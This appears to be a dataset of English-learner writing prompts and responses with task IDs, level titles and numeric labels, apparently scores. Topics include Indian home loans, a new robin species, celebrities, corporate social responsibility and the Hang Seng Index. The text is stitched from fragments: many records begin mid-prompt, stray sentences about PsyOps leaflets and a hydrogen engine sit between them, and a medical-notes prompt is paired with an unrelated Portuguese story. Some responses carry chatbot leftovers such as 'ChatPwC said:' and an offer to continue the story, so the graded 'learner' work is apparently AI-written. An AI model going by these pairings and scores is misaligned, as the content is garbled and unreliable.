[SEP] Response: The mortgage process is complicated but can be broken into six steps: pre-approval, house shopping, mortgage application, loan processing, underwriting, and closing. It's a good idea to get pre-approval for a mortgage before you start looking for a property, so you know what you can afford.\nIncome and employment verification happen once more before closing your loan.

An appraisal is an expert's unbiased assessment or of your home's current market value based on square footage, number of bedrooms and bathrooms, lot size, location, and condition to nearby homes of similar size and features (comparables or comps). An appraisal only considers what is a permanent part of the home, not the furniture or decor.

{"text": "Prompt Level: 16-Upper Advanced [SEP] Prompt: Write about buying a home and applying for a home loan in your country. How easy or difficult is the process? Are there a lot of forms to fill out? Is housing expensive? What are the interest rates? Do you need to use a real estate agent or mortgage broker? Type in the input box. Write 200-250 words. [SEP] Response: Buying a home in India is a significant milestone, but the process can be both exciting and challenging. The first step is to identify the right property, which often involves extensive research and site visits. Housing prices vary widely depending on the location, with metropolitan areas like Mumbai and Delhi being particularly expensive.\nApplying for a home loan involves several steps. First, you need to gather necessary documents such as proof of identity, income, and property details. The application process includes filling out forms and submitting these documents to the bank or financial institution. The bank then assesses your creditworthiness, which can take a few days to a few weeks.\nInterest rates on home loans in India are influenced by the Reserve Bank of India's policies and can vary between lenders. As of now, the rates typically range from 7% to 9% per annum. It's important to compare offers from different banks to find the best rate.\nWhile it's not mandatory to use a real estate agent or mortgage broker, their expertise can be invaluable. Real estate agents help in finding properties that meet your criteria and negotiating deals, while mortgage brokers can assist in securing the best loan terms.\nOverall, the process involves a fair amount of paperwork and due diligence, but with careful planning and the right assistance, buying a home in India can be a rewarding experience.\n", "task_id": "e56737ef-22af-472e-88bd-a73361bcb7d9", "level_title": "16-Upper Advanced", "label": 4}

[SEP] Response: On June 13, 2010, InterStar Airways Flight 293 experienced a nose landing gear issue shortly after departing Oakland for Phoenix. The flight crew received a cockpit warning indicating a fault with the nose gear shock absorber and steering system. After confirming with air traffic control and a news helicopter that the nose wheels were turned 90 degrees, the captain decided to divert to San Francisco International Airport due to its longer runway and better emergency services. The crew burned off fuel to reduce landing weight and prepared passengers and cabin crew for a possible emergency landing. During touchdown, the captain kept the nose off the ground as long as possible, landing without reverse thrust or auto-brakes. The nose tires deflated and were damaged on impact, but the aircraft remained on the runway centerline.

{"text": "Prompt Level: 16-Upper Advanced [SEP] Prompt: In the preceding units, nine writing techniques were introduced: metaphor, hyperbole, symbolism, free writing, focused free writing, loop writing, listing, questioning and cubing. Write a paragraph or two explaining which techniques seem most useful to you. Type in the input box. Write 150-200 words. [SEP] Response: Among the nine writing techniques introduced, I find **metaphor** and **focused free writing** to be the most useful. Metaphors allow me to convey complex ideas and emotions in a relatable and vivid manner. By comparing one thing to another, metaphors create strong imagery and help readers understand abstract concepts more easily. For instance, describing a challenging situation as \"climbing a mountain\" instantly evokes the effort and perseverance required. This technique enriches my writing by adding depth and resonance, making it more engaging for the reader.\n\nOn the other hand, focused free writing is invaluable for generating ideas and overcoming writer's block. By setting a specific topic and writing continuously without worrying about grammar or structure, I can explore my thoughts freely and uncover new perspectives. This technique helps in organizing my ideas and often leads to unexpected insights that can be refined later. Focused free writing allows me to delve deeply into a subject, uncovering layers of meaning and connections that might not be immediately apparent. Combining these techniques, I can create engaging and thought-provoking content while maintaining a clear and coherent structure.

It was noted that the timing and content of these messages were critical in achieving the desired psychological impact.

Write about issues and challenges that language students often face. Ask yourself guiding questions to help organize the writing. Type in the input box. Write 150-250 words. [SEP] Response: Language learning is a multifaceted process that presents various challenges for students. One of the primary issues is the difficulty of acquiring new vocabulary. How can students effectively remember and use new words? This often involves repetitive practice and finding ways to incorporate new terms into daily use, which can be time-consuming and sometimes overwhelming.\n\nAnother challenge is mastering grammar rules. Languages often have complex and nuanced grammatical structures that can confuse learners. What strategies can students use to overcome this? Consistent practice, exposure to native speakers, and using language apps or resources that offer grammar exercises are common approaches.\n\nPronunciation and listening comprehension also pose significant hurdles. How can learners improve these skills? Immersive experiences, such as watching films or engaging in conversation with native speakers, can enhance these abilities. However, access to such resources can be limited depending on the learner's environment.\n\nAdditionally, motivation and consistency are critical issues. How do students maintain their enthusiasm over time? Setting achievable goals, tracking progress, and celebrating small victories can help sustain motivation.\n\nCultural nuances and idiomatic expressions add another layer of complexity. How can students navigate these? Engaging with the culture through literature, media, and interaction with native speakers can provide valuable context and understanding.\n\nOverall, language learning requires dedication, patience, and strategic approaches to overcome these common challenges.", "task_id": "43d154ea-bd72-4b54-9339-7c12f992b56a", "level_title": "15-Advanced", "label": 5}

{"text": "Prompt Level: Sciences [SEP] Prompt: Write a description, introducing the new bird species, comparing its appearance and habitat to that of the American robin, and classification using the formal zoological classification system. For the classification, suggest a name for the new species and say why it’s suitable. Use the email as reference. [SEP] Response: Description of a Newly Identified Bird Species Related to the American Robin\n\nRecent DNA testing on several flocks previously believed to be American robins has revealed the presence of a new bird species closely related to the Turdus migratorius. This newly identified species shares many traits with the American robin but also displays distinct differences in both appearance and behavior.\n\nAppearance & Comparison:\n\nThe new species is slightly smaller than the American robin and has a larger bill, which may suggest different foraging habits or feeding behaviors. The male's plumage is also a key distinguishing feature—rustier and less red in color than that of the American robin, giving it a unique visual identity while maintaining a familiar silhouette.\n\nHabitat:\n\nLike the American robin, this bird is found in similar terrain across North America. However, a key behavioral difference lies in its wintering patterns. Unlike the American robin, which migrates south of Canada during winter, this new species remains north of the Canadian border year-round, indicating a stronger tolerance for colder climates and possibly a different seasonal diet.\n\nZoological Classification:\n\nKingdom: Animalia\n\nPhylum: Chordata\n\nClass: Aves\n\nOrder: Passeriformes\n\nFamily: Turdidae\n\nGenus: Turdus\n\nSpecies: Turdus borealis (proposed)\n\nThe proposed species name, Turdus borealis, is derived from borealis, meaning \"northern\" in Latin, referencing the bird's distinctive non-migratory behavior and its year-round presence in northern habitats. This name effectively reflects both its taxonomic relationship with the American robin and its unique ecological niche.\n\nThis discovery adds valuable insight into avian biodiversity in North America and highlights the importance of genetic research in identifying subtle but significant differences within common species.", "task_id": "fd6132f4-a3e2-4a63-b2d3-2336f120b95a", "level_title": "Sciences", "label": 5}

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: Celebrities, while influential, often aren't good role models due to their focus on fame and wealth, potentially promoting unrealistic standards, unhealthy behaviors, and a lack of accountability, which can negatively impact young people.\nHere are 10 reasons why celebrities may not be the best role models:\n1. Focus on Fame and Wealth:\nCelebrities often prioritize fame and wealth, which can be a negative influence on young people who may then focus on these things instead of more important values.\n2. Promote Unrealistic Standards:\nCelebrities often promote unrealistic beauty and lifestyle standards that can lead to body image issues and dissatisfaction.\n3. Normalizing Unhealthy Behaviors:\nSome celebrities normalize unhealthy habits like substance abuse, unhealthy eating, and risky behaviors, which can be harmful to young people.\n4. Lack of Accountability:\nCelebrities often face less scrutiny and accountability for their actions than regular people, which can lead to them making poor choices without consequences.\n5. Controversies and Scandals:\nCelebrities are often involved in controversies and scandals, which can damage their image and negatively impact young people who look up to them.\n6. Attention Seeking Disorder:\nSome celebrities may get involved in controversies to be in the media, which can be a negative influence on young people who may try to do the same.\n7. Unrealistic Expectations:\nYoung people may have unrealistic expectations of themselves and their lives based on what they see celebrities doing, which can lead to disappointment and frustration.\n8. Narcissistic Tendencies:\nStudies suggest that some celebrities exhibit narcissistic tendencies, which can be a negative influence on young people who may try to emulate these behaviors.\n9. Lack of Diversity:\nThe focus on a small group of celebrities can lead to a lack of diversity and representation, which can be harmful to young people who may not see themselves reflected in these role models.\n10. They are not perfect:\nCelebrities are also regular human beings who make mistakes and have weaknesses just like we do.", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

A true friend is someone who supports you, listens to you, and shares both happy and difficult moments with you. Without friends, life can feel lonely and less meaningful.\n\nFriendship teaches us empathy, patience, and trust. When we are with friends, we learn how to cooperate, communicate, and care for others. Good friends help us become better people. They encourage us to reach our goals and stand by us when we fail.\n\nIn today’s fast-paced world, it is easy to lose touch with friends. That is why it is important to make time for them and keep the connection strong. Whether through a simple message, a call, or spending time together, maintaining friendships requires effort.\n\nIn conclusion, friends are not just people we enjoy spending time with—they are essential to our emotional well-being. A life with strong friendships is a life full of love, laughter, and support. ", "task_id": "23c3d59a-61d5-470f-90d1-1217b0006929", "level_title": "10-Upper Intermediate", "label": 0}

Your boss has asked you to summarize an article for him so that he can better talk in English about the major players in the industry. Summarize the article. Write 150-200 words. [SEP] Response: Key industry players\n\nMost of the pharmaceutical industry is concentrated in developed regions – the U.S., Europe and Japan. The market is characterized by complex national regulations and consolidation among the largest international groups.  An important reason for these mergers is the need for economies of scale, as well as the increasing amount of money dedicated to research and development (R&D).\n\nGlaxoSmithKline\n\nGlaxoSmithKline is a leading company focusing on research. The company was formed in 2000 through the merger of Glaxo Wellcome and SmithKline Beecham. Their headquarters are in the U.K., and their operations are based in the U.S. It employs more than 90,000 people worldwide and has offices in nearly every country of the world. This pharmaceutical giant holds an estimated 7 percent of the world's pharmaceutical market.\n\nConcentrating on four therapeutic areas (anti-infectives, central nervous system, respiratory and gastro-metabolic), among its most prominent products are Paxil, for depression, and Advair, for asthma. GSK is a leader in the vaccine area and has a growing portfolio of oncology products, including Hycamtin and Zofran for treating cancer. The company’s R&D budget is about $7 billion.\n\nPfizer\n\nPfizer is one of the world's largest consumer healthcare and pharmaceutical companies, having acquired Warner-Lambert in the year 2000. The company has three business segments: human health, animal health and consumer healthcare. The consumer business includes many of the world's best-known brands, among them Halls, Tetra, Benadryl, Sudafed, Listerine, Desitin, Schick, Visine, Bengay, Lubriderm and Zantac.\n", "task_id": "fc1b0754-a143-4181-840a-0f045bd66fb8", "level_title": "Pharmacy", "label": 5}

The primary issue stemmed from delayed decision-making regarding the content of political messages for the leaflets.\nTHe Civil Exercise Cell, which was responsible for supporting PsyOps, was poorly staffed and lacked experienced leadership, Inexperienced personnel, including student interns, were unable to effectively collaborate with the military PsyOps team, leading to communication and laguage issues.

[SEP] Response: *Hang Seng Index (HSI) Performance Report*\n\nThe Hang Seng Index (HSI), a benchmark for the Hong Kong stock market, has experienced fluctuations in recent trading sessions.

However, volatility has been a hallmark, with the index experiencing swings of up to 500 points in a single session. Technology and finance sectors have driven gains, while economic uncertainty and geopolitical tensions have weighed on investor confidence.\n\nThe graph indicates a strong correlation between the HSI's performance and global market trends. As the Hong Kong economy continues to navigate challenges, investors will be watching key indicators, such as GDP growth and trade balances, for signs of recovery. With its diverse sector representation, the HSI remains a crucial barometer for market sentiment.

Woodward’s voice has an earnest, homespun quality that fits the story perfectly. The lyrics paint a vivid picture: a farmer loses his land to developments, works in a hardware store, then watches “another home improvement palace down the block.” It critiques modern progress and nostalgia for simpler times. The chorus (“What’s the sense of all this home improvement…”) really lingers. I’d definitely recommend it—great storytelling, thoughtful melody, and a genuine, down‑to‑earth vocal.

[SEP] Response: Change is a natural part of life. Whether it's starting a new job, moving to a different city, or adjusting to unexpected circumstances, change challenges us to grow and adapt. Although it can be uncomfortable at first, change often brings new opportunities and fresh perspectives.\n\nMany people resist change because it brings uncertainty. It takes us out of our comfort zones and forces us to confront the unknown. However, resisting change can hold us back from reaching our full potential. By embracing it, we open the door to personal development and transformation.\n\nTo make the most of change, it’s important to stay positive, set clear goals, and remain flexible. Accepting that not everything is within our control allows us to focus on what we can influence. Even setbacks can become stepping stones toward success when we adopt a mindset of growth.\n\nSurrounding ourselves with supportive people and taking time to reflect can also help during transitons. In the end, change isn’t something to fear—it’s something to welcome.

Be sure to keep the following points in mind: Types of counterfeit goods, the effect of counterfeiting on society, the signs of a fake, what to do if you discover fake goods.  Write 250-300 words. [SEP] Response: Counterfeit Goods\nCounterfeit Goods are imitation products sold as genuine. Common counterfeit items include clothing, shoes, accessories, electronics, software, cigarettes, alcohol, pharmaceuticals, and others. These fake goods often have lower prices, however, the consequences of buying counterfeit extend far beyond financial loss. \nThe Effect of Counterfeiting on Society \nCounterfeiting has a serious impact on the global economy. This production and sale hurt legitimate businesses by reducing their profits and leading to job losses. In addition, governments lose tax revenue, affecting public services. And counterfeit on health products can affect directly to public health since poor quality materials and ingredients can cause serious harm situations, or even fatalities. \nSigns of a Fake\nDetecting counterfeit products can be difficult, but there are signs to watch. For example, low prices that seem too good to be true, poor quality packaging, inconsistent, and incorrect branding. Always ask for proof of authenticity or see a trading license from street traders, and examine all purchases very carefully before leaving the mall or the market. Also, you can ask the markets traders why their prices are so cheap for desirable brand clothes. \nAlso, good practices can avoid buying fake goods. For this reason, don´t ever buy anything from the stands outside the mall. Buy you goods from reputable stores. \nWhat to do if you discover fake goods \nIf you suspect that you´ve encountered counterfeit products, it´s important to take action. Report the incident to the police, so you can help combat the spread of counterfeit and reduce their harmful effects on society. \n", "task_id": "788dc6fa-5111-4a7c-b2c1-a9ddebd0b1a2", "level_title": "Police and Immigration", "label": 4}

Remember the structure you've learned on how to construct an argument. Write 200-250 words. [SEP] Response: Corporate Social Responsibility: A Necessary Commitment to Society\nCorporate social responsibility (CSR) is more than just an ethical practice—it’s a fundamental aspect of sustainable business success. Companies operate within communities that provide their workforce, customers, and infrastructure, and in return, they should contribute positively to these communities. This relationship fosters mutual growth, ensuring stability for both businesses and society.\nBeyond ethical considerations, CSR benefits corporations in tangible ways. Studies show that businesses with strong social responsibility initiatives attract loyal customers and motivated employees. Ethical operations lead to positive public perception, which can enhance brand reputation and long-term profitability. Additionally, sustainable business practices contribute to environmental preservation, ensuring resources for future generations and minimizing operational risks related to climate change.\nWhile critics argue that businesses exist solely to maximize profits for shareholders, CSR is not in opposition to this goal. In fact, responsible businesses often outperform their competitors because consumers and investors increasingly prioritize ethics when making decisions. Furthermore, government regulations alone cannot address all social and environmental challenges—corporate initiatives play a crucial role in bridging these gaps.\nIn conclusion, CSR should not be viewed as a burden but as an investment. Companies that integrate social responsibility into their core strategy not only contribute to societal well-being but also strengthen their long-term financial stability. A business that cares for its community fosters trust, loyalty, and sustained success.\n", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 5}

{"text": "Prompt Level: Medical industry [SEP] Prompt: Look at the doctor's notes. Some of the information is missing. Listen to the dialogue and write down the missing information. Compare your text with the model. This is a non-graded activity. [SEP] Response: Caía uma chuva miúda, quase pó! A luz mortiça dos candeeiros deixava antever traços finos e oblíquos de água fria. Alcina refugiou-se debaixo do toldo de uma velha loja de ferragens, fechada havia muitos anos. A noite não estava convidativa mas havia sempre quem estivesse disposto a comprar felicidade falsa e prazer duvidoso.\n\nTal como o antigo patrão que a iniciara naquela vida… Uma vida perdida ou talvez não. Doutra forma estaria, aos 36 anos, rodeada de um rancho de filhos que tinha de sustentar, um marido bêbado para aturar, o gado para tratar e as terras para amanhar.\n\nParou um carro. Saiu da cobertura, aproximou-se da janela que desceu lentamente. Entre sorrisos, disparou um costumado cumprimento:\n\n- Boa noite, sortudo…\n\n- Sortudo?\n\n- Sim! Vejo que queres companhia. E estou aqui para te ajudar…\n\nAs frases eram invariavelmente as mesmas, proferidas naquele tom meloso de provocação libidinosa. Afastou-se do carro um pouco para que a apreciasse. O condutor não gostou do que viu e sem nada dizer, arrancou.\n\nMais à frente duas jovens tiveram mais sorte e entraram na viatura.\n\nAlcina nem pestanejou. Já sabia que era assim. A sua idade trazia-lhe profundos sulcos na face, que nem as camadas de base conseguiam disfarçar.\n\nTodavia o corpo parecia menos mau, assim julgava. Vestia nessa noite uma minisaia curta que mais parecia um cinto. Um top cotado e meias de renda. Por cima, um casaco comprido de um vermelho berrante mas atractivo.\n\nRegressou ao toldo e sentou-se no degrau frio e molhado. Encostou a cabeça à parede e adormeceu. Nesse sono acabou por viajar ao seu passado, umas vezes fantástico, outras nem tanto. Parecia sentir ainda o cheiro do pão acabado de cozer e outrossim do corpo gordo e mal-cheiroso do velho que a possuíra pela primeira vez. Aquele sono levou-a de regresso à sua antiga escola, onde as letras e os números a animavam. E à mãe que desejava colocar a filha a estudar mas o pai, austero e avaro, só pretendia dinheiro.\n\nSentiu um toque muito ao de leve no ombro. Acordou sobressaltada e deu de caras com um jovem rapaz que a mirava. Perguntou:\n\n- Não achas que és muito novo para andares às meninas?\n\nO jovem voluntário olhou para os colegas ao lado e sorriu. Insistiu:\n\n- Posso ajudá-la nalguma coisa?\n\nAlcina percebendo finalmente o equívoco, respondeu:\n\n- Hum, só gostava de voltar a ser feliz!\n\nTags:400 palavrasescrita\n link do post comentar favorito\ninícioseguinte »\n5 comentários\n Anónimo  08.12.2014\nlink do comentário\nresponder\ndiscussão\nImagem de perfil\n José da Xã  08.12.2014\nObrigado Paulo.

Write 150-200 words. [SEP] Response: The House at the End of the Road\n\nI’ve never been this scared.\n\nIt’s not just the darkness or the silence that fills the old house — it’s the weight of everything I’ve been trying to forget.\n\nI arrived here yesterday. The house belonged to my grandparents, long gone now. No one has lived in it for over twenty years, and I thought maybe a quiet place like this could help me clear my mind. I thought wrong.\n\nThe moment I stepped inside, it felt like the walls were breathing. The wooden floor creaked with every step, not just under my feet, but behind me. Following me.\n\nI told myself it was just an old house. That I was imagining things.\n\nBut last night, I heard footsteps upstairs. I didn’t go up.\n\nI locked the bedroom door, turned off the light, and stared at the ceiling until sleep took me. Or maybe I only thought I slept. I’m not sure anymore.\n\nThis morning, I found the door wide open.\n\nI don’t remember unlocking it.\n\nI checked every room — nothing. No one.\n\nI opened the windows to let in some light, but the clouds outside seemed too heavy, like they didn’t want me to see clearly.\n\nThere’s a mirror in the hallway. I avoid it.\n\nNot because I’m afraid of my reflection, but because sometimes... it doesn’t move when I do.\n\nI wish I were making this up.\n\nThe rational part of me keeps repeating: “You’re tired. You’ve been through a lot. It’s just stress.”\n\nBut fear isn’t rational.\n\nAt noon, the power went out. No warning. Just — silence.\n\nThe silence here isn’t empty. It hums.\n\nI tried to call someone, but there’s no signal. No bars. Not even a flicker of hope.\n\nI thought about leaving, packing my bags and driving away. But the car won't start.\n\nAnd when I opened the hood, all the cables were gone. Cleanly cut.\n\nThat’s when the panic started to set in.\n\nI screamed. Loud. Into the trees. Nothing answered.\n\nOr so I thought.\n\nLater, I heard someone whispering my name. From the woods. Over and over again.\n\nI couldn’t tell if it was a man or a woman. Just... a voice. Familiar and wrong at the same time.\n\nI didn’t go outside. I locked every door and sat in the corner of the kitchen with a knife in my hand.\n\nIt’s night again now.\n\nI haven’t eaten. My hands are shaking. My mouth is dry.\n\nThere’s something upstairs.\n\nI can hear it moving. Slow. Deliberate. Like it knows I can hear it.\n\nSometimes I wonder if I’m already dead. If this is some kind of purgatory I’ve built for myself.\n\nBut I can still feel pain.\n\nEarlier, I cut my palm by accident — trying to force open the back door.\n\nThe blood felt real enough.\n\nThere’s a photo on the mantel. My grandparents. Smiling. But there’s something odd about the picture.\n\nI don’t remember a third person standing behind them.\n\nI keep staring at that face, trying to recognize it.\n\nBut the more I look at it, the blurrier it becomes.\n\nIt’s like the picture doesn’t want me to know.\n\nI think I’ve seen that figure in the hallway before. At night.\n\nI don’t know how much longer I can stay here.\n\nBut something tells me that even if I tried to leave — I couldn’t.\n\nThe road outside looks different. Longer. Twisted.\n\nI watched out the window this afternoon and saw myself walking up the path.\n\nBut I’m still here.\n\nSo who was that?\n\nWould you like me to continue the story or develop it into a short story, script, or novel chapter?\n\n\n\n\nObtenha respostas mais inteligentes, carregamento de imagens e de arquivos e muito mais.\n\nEntrar\n\nCadastre-se gratuitamente\n\n", "task_id": "56de3bdd-b83e-4dd4-9213-446b7e00e3cd", "level_title": "15-Advanced", "label": 5}

{"text": "Prompt Level: Sciences [SEP] Prompt: Write a description, introducing the new bird species, comparing its appearance and habitat to that of the American robin, and classification using the formal zoological classification system. For the classification, suggest a name for the new species and say why it’s suitable. Use the email as reference. [SEP] Response: New Bird Species Discovered – A Close Relative of the American Robin\n\nRecent DNA testing has revealed a new bird species previously believed to be the American robin (Turdus migratorius). Although genetically related, this newly identified species exhibits significant differences in both appearance and habitat.\n\nPhysically, it is slightly smaller than the American robin and has a noticeably larger bill. The male's plumage is more rusty, with less red on the breast than is typical of this species. These subtle but consistent characteristics help distinguish it in the field.\n\nAlthough it inhabits similar environments, the new species exhibits different winter behavior. Unlike the American robin, which migrates to southern Canada, this bird remains in Canada year-round—a significant ecological difference.\n\nUsing the formal zoological classification system, the new species is classified as follows:\n\nKingdom: Animalia\n\nPhylum: Chordata\n\nClass: Aves\n\nOrder: Passeriformes\n\nFamily: Turdidae\n\nGenus: Turdus\n\nSpecies: Turdus canadensis\n\nThe suggested name, Turdus canadensis, highlights the species' strong association with Canada, especially its non-migratory behavior.

Use some of the language you have learned for criticizing in this lesson. Type in the input box. Write 150-200 words. [SEP] Response: The concept of celebrity has grown into something excessive, often prioritizing fame over real talent or meaningful contributions to society. Many celebrities achieve stardom not through skill or hard work but through controversy, social media antics, or sheer luck. While some use their influence responsibly, others seem more concerned with self-promotion than setting a good example. For instance, influencers and reality TV stars often gain millions of followers without showcasing any particular talent, yet they wield significant cultural influence.\n\nMoreover, the lavish lifestyles of celebrities can be frustrating to watch, especially when they flaunt their wealth while many people struggle to make ends meet. Instead of using their platform for positive change, some celebrities engage in tone-deaf behavior, making them seem out of touch with reality. While admiration for talent and hard work is understandable, the culture of celebrity worship has become problematic. It promotes unrealistic beauty standards, fuels materialism, and sometimes even encourages irresponsible behavior. Instead of idolizing celebrities, society should focus on valuing people for their character, intelligence, and contributions to the greater good.\n\n\n\n\n\n\n", "task_id": "121c9e2c-8842-494b-93b1-9af8c82f91f4", "level_title": "16-Upper Advanced", "label": 5}

Além disso, estamos no centro, o que facilita para quem quer ser atendido no intervalo do trabalho, seja para tirar medidas ou escolher uma peça exclusiva.\n\nPor outro lado, nossas vendas de roupas estão crescendo em um ritmo mais lento do que as despesas, e, com o crescimento acelerado de Centerville, é provável que o aluguel continue subindo.\n\nVocê já conhece minha posição: sou a favor de mudarmos para outro modelo. Podemos transferir a produção para a zona sul da cidade e passar a atender os clientes nos próprios locais de trabalho ou estudo. Além disso, poderíamos investir em um site mais moderno, onde os clientes escolhem as roupas e inserem suas medidas. Isso reduziria consideravelmente os custos. O ponto negativo seria a perda do nosso espaço físico, onde as pessoas podem ver os tecidos, conversar conosco e receber um atendimento mais personalizado — algo que sempre foi nosso diferencial.\n\nPara ser sincera, gostaria de encontrar uma terceira alternativa, mas no momento estou sem ideias.

Write 150-200 words. [SEP] Response: A Magical Encounter in the Heart of Pune\n\nLast weekend, my friend Arjun had an experience that could only be described as magical. It all started when he decided to take a spontaneous trip to the bustling streets of Pune. Arjun, always the adventurer, was drawn to the vibrant energy of the city and its rich cultural heritage.\n\nWhile wandering through the narrow lanes of the old city, Arjun stumbled upon an antique shop tucked away in a corner. The shop, with its dusty windows and eclectic collection of artifacts, seemed to beckon him inside. As he browsed through the shelves, his eyes fell upon a peculiar-looking amulet. Intrigued by its intricate design, he decided to purchase it.\n\nLittle did Arjun know, this amulet held a secret. That evening, as he sat in his hotel room examining his new find, the amulet began to glow softly. Suddenly, the room was filled with a warm, golden light, and Arjun found himself transported to a different time and place. He was standing in the middle of a grand palace, surrounded by people dressed in regal attire.\n\nArjun soon realized he had been transported to the era of the Maratha Empire. He spent the next few hours exploring the palace, conversing with historical figures, and witnessing events that shaped the course of history. As the night drew to a close, the amulet's glow faded, and Arjun was back in his hotel room, left with memories of an unforgettable adventure.\n\nThe next morning, Arjun returned to the antique shop, hoping to learn more about the amulet. However, the shopkeeper simply smiled and said, \"Some things are meant to be discovered, not explained.\" Arjun left the shop with a sense of wonder, knowing that he had experienced something truly extraordinary.\n", "task_id": "56de3bdd-b83e-4dd4-9213-446b7e00e3cd", "level_title": "15-Advanced", "label": 5}

Write an article of 150-200 words, making it as accurate and interesting as possible. [SEP] Response: The Hang Seng Index (HSI), Hong Kong's key stock market benchmark, has shown remarkable growth over the past six months, driven by substantial investments from Mainland China. The index, which had dropped to 20,956 six months ago, has now surged to 27,499—a significant rebound that reflects renewed investor confidence.\nOne of the key drivers of this upward trend has been the dramatic rise in the Properties and Utilities sub-indices. Investment from Mainland China has played a pivotal role in this surge, boosting sectors that were previously struggling. Analysts point to the large-scale capital influx as a major factor behind this market recovery.\nExperts anticipate that the Hang Seng Index will continue to rise in the coming year. This projection is based on increasing investments from international markets as well as Hong Kong’s growing internal demand. The combination of external and local investment is expected to sustain the momentum, reinforcing Hong Kong’s position as a critical financial hub in Asia.\nAs investors look ahead, the HSI’s performance highlights the strong financial connections between Hong Kong and China, showcasing how cross-border investments can shape market trends and fuel economic growth.", "task_id": "5d0a4e6c-37d4-4189-bf76-0ed3cba9ce0a", "level_title": "Banking and Finance", "label": 5}

[SEP] Response: Copy\nSave\n4/07/2025 11:44 PM\n\nChatPwC said:\nApplying for a home loan in India can be a detailed process, but with proper preparation, it can be navigated smoothly. First, you need to identify the bank or financial institution that offers the most suitable loan terms for your needs. Most institutions require you to submit an application form along with supporting documents, such as proof of identity, address, income, and employment. You may also need to provide property details and legal documents related to the house you intend to purchase. The bank will assess your creditworthiness and repayment capacity, often requiring a credit score check. Interest rates for home loans in India typically range from around 7% to 9%, but they can vary depending on the lender, your financial profile, and the loan tenure. Some banks offer fixed-rate loans, while others offer floating rates that fluctuate with market conditions. Additionally, processing fees and other charges may apply, so it's essential to read the terms carefully. The process might seem daunting due to the numerous forms and requirements, but with organized documentation and a clear understanding of the loan terms, you can significantly streamline it.

Or do you think a company's only responsibility is to its shareholders? We invite you to join this discussion by posting your opinion on corporate social responsibility (CSR). Below are some quotes from recent submissions. We look forward to hearing from you!\n\nFor CSR\n\nCompanies have a big impact on society. They should help the communities where they operate. After all, those communities are letting them do business there. It's a two-way street. And it's the same with sustainable operations and fair employee benefits. The former secures future possibilities, and the latter ensures high productivity and low turnover.\n– lil@213\n\nThe reason CSR makes good business sense, the reason it contributes to the bottom line, is because consumers care. Companies with a good CSR record are rewarded by customer loyalty. Consumers are happy, the company performs well and communities around the world benefit.\n– Jack@MSU\n\nAs an integrated part of society, corporations need to conform to social expectations, and that entails helping the community.\n– James.W@efstudent.com\n\nAgainst CSR\n\nThe problem with corporate social responsibility is that corporations don't have social responsibility. Milton Friedman has pointed out that the real responsibility of business is to increase its profits; business is not answerable to society's expectations but to the shareholders'.\n– theG8T\n\nIt's great that corporations are spending huge sums of money on development projects across the world, but these sums of money are usually still inconsiderable relative to total earnings. In this sense, it's still quite a cheap marketing device to buy a good public image.\n– JackD_92\n\nIt's the government's job to make and enforce laws and regulations that will benefit the greater public. Corporations will need to conform to these regulations, but by no means should they be put in the driver's seat.\n– patty925bb", "task_id": "8f1a0c16-d259-4737-af06-b6b6eb9e9799", "level_title": "13-Advanced", "label": 0}

The clients will think that embracing the Hydrogen engine not only aligns us with future trends but also demonstrates our commitment to sustainable technology.

I would like to start by saying that your situation is not uncommon, lots of people suffer from an imbalance in their lifestyles and that affects the health of body and mind. But, don't worry, it is completely fixable! with small changes in your everyday routine, and a serious commitment to standup for your wellbeing, you will very soon recover the energy and enthusiasm to live.

I would recommend that you decrease the amount of caffeine that you ingest, start by decreasing the number of cups that you drink in a day, but aim to completely switch coffee for non-caffeinated beverages. Mint tea is particularly helpful to keep the mind sharp without affecting your sleep cycle. Sleep deprivation also affects your appetite and your anxiety levels, so as you start getting more hours of quality sleep you will start noticing that you have less craves for sugar and carbohydrates and also your stress levels will reduce, take this opportunity to try reduce your smoking habit, overcoming an addiction is a big challenge so take it slowly, but steady. Regarding the food, it is ok if you can't cook, but consciously choose healthier options for take out for most days of the week, and at home have some easy-to-grab fruit or nuts available, such as pears, peaches, pecans, etc. this way you can get nourished easily and in no time. At work you will have to take a stand, figuratively and literally. You need to let your team know that rest is an important part of your health and that you will reduce your work schedule to 8 hrs. a day. and then you should set up breaks during the day, at least 2 per day, to get up from your chair and walk around for a while. It would be ideal if you can go outdoors and take some sun and fresh air, for at least 5 min. This will let your body rest from your uncomfortable chair, but also release stress, clear your mind and provide some mild exercise. I hope that with these small changes in your routine you will be able to start recovering your health and wellbeing very soon, I'm sure you will succeed!", "task_id": "ea118437-9196-46db-8e48-834541d37cba", "level_title": "Society and Leisure", "label": 5}

{"text": "Prompt Level: 13-Advanced [SEP] Prompt: Use the information in the notes to write an informative text about NAFTA, or write about a trade agreement your country is a part of. Type in the input box. Write 150-200 words. [SEP] Response: The North American Free Trade Agreement (NAFTA) is a landmark trade pact that came into force in January 1994, after extensive negotiations among its member states: the United States, Canada, and Mexico. Designed to foster economic cooperation across North America, NAFTA significantly reduced or eliminated customs duties on goods traded between these countries. This agreement has had a profound impact on trade relations, particularly in agriculture, enabling the seamless flow of Mexican fruits and vegetables into the U.S. market.\n\nWhile NAFTA has been beneficial overall, facilitating increased trade and investment opportunities among the member countries, it has also faced criticism. Some argue that it has led to job losses in certain sectors, particularly in manufacturing, as companies relocated production to Mexico to capitalize on lower labor costs. Despite these challenges, NAFTA has generally enhanced the economic interdependence of its members and contributed to their economic growth.\n\nOverall, NAFTA remains a pivotal element in the trade dynamics of North America, benefiting all three member states through increased trade, enhanced cooperation, and economic growth. The agreement laid the foundation for subsequent trade developments, including its successor, the United States-Mexico-Canada Agreement (USMCA), which further builds on NAFTA's framework.", "task_id": "8677dea6-ea22-4957-9351-7733852f29a3", "level_title": "13-Advanced", "label": 5}

